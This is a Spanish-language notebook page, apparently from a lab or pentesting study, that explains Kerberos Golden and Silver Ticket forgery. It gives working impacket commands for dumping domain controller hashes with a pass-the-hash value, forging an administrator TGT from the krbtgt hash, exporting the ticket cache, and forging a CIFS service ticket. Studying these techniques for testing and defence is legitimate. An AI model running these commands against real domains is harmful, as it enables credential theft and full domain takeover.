<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>GoldenTicket/SilverTicket</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>GoldenTicket/SilverTicket</h1><br/><p><h1>¿QUE ES GOLDEN TICKET Y SILVER TICKET EN KERBEROS?</h1></p><p></p><p>Consisten en mas o menos el mismo fundamento que lo anterior, construirnos nuestros propios TGT y TGS.</p><p></p><p>Claramente para poder hacer esto necesitaríamos de alguna forma la clave privada o hash de la password del usuario krbtgt que vimos en el DomainControler pues este se encarga de enviar todos estos tickets.</p><p></p><p>Por tanto estos métodos se basan en que ya hemos conseguido el hash de la contraseña del usuario krbtgt del KeyDistributionCenter.</p><p>Esto se ha podido hacer por ejemplo con los fallos de DCSYN haciendo una copia de la base NTDS donde se encuentra el hash o bien hemos conseguido el hash NTLM dentro de una maquina en memoria que correspondía a un usuario con privilegios de dominio o locales en el DC y hemos volcado la información de la memoria en la que se encuentra el hash del usuario krbtgt.</p><p></p><p>La clave de sesión se deriva de este hash.</p><p></p><p></p><p>Suponemos el caso anterior en el que hemos encontrado credenciales de un usuario con ciertos privilegios a nivel de dominio o locales en el DC01:</p><p></p><p><div class="codebox"><pre><br />impacket-secretsdump administrador@192.168.20.5 -hashes <span style="color:#000000;font-weight:700">:</span>a87f3a337d73085c45f9416be5787d86 </pre></div></p><p></p><p><img src="images/41-1.png" alt="images/41-1.png" /></p><p></p><p>El que nos interesa concretamente es el nthash.</p><p></p><p>En el siguiente comando de impacket necesitamos el domain SID que es muy sencillo de obtener, sin privilegios y con powerview o el modulo ADD:</p><p></p><p><img src="images/41-2.png" alt="images/41-2.png" /></p><p></p><p></p><p><h3>GOLDEN TICKET:</h3></p><p></p><p>Ahora si con impacket indicamos la información que tenemos y lo interesante es que podemos generar un ticket para cualquier usuario que queramos ya que contamos con la clave del krbtgt hasheada para generarlos:</p><p></p><p><div class="codebox"><pre><br />impacket-ticketer -nthash 045ecb93536d5800d0b0e0b2ad06f7eb -domain-sid S-1-5-21-1064896359-874047782-4089327042 -domain corp.local administrador</pre></div></p><p></p><p><img src="images/41-3.png" alt="images/41-3.png" /></p><p></p><p>Impacket crea el golden ticket o tgt de administrador.</p><p></p><p>Ahora si tenemos que volver a exportar la clave KRB5CCNAME para poder utilizar las mismas técnicas de antes:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">export</span> <span style="color:#8ae234;font-weight:700">KRB5CCNAME</span>=<span style="color:#000000;font-weight:700">/</span>home<span style="color:#000000;font-weight:700">/</span>kali<span style="color:#000000;font-weight:700">/</span>Desktop<span style="color:#000000;font-weight:700">/</span>administrador.ccache</pre></div></p><p></p><p><img src="images/41-4.png" alt="images/41-4.png" /></p><p></p><p></p><p><h3>SILVER TICKET</h3>:</p><p></p><p><div class="codebox"><pre><br />impacket-ticketer -nthash 045ecb93536d5800d0b0e0b2ad06f7eb -domain-sid S-1-5-21-1064896359-874047782-4089327042 -domain corp.local -spn cifs<span style="color:#000000;font-weight:700">/</span>DC01.corp.local administrador</pre></div></p><p></p><p><img src="images/41-5.png" alt="images/41-5.png" /></p><p></p><p>Y a partir de ahora ya podemos usarlo con las anterior técnicas.</p></div>
</body>
</html>
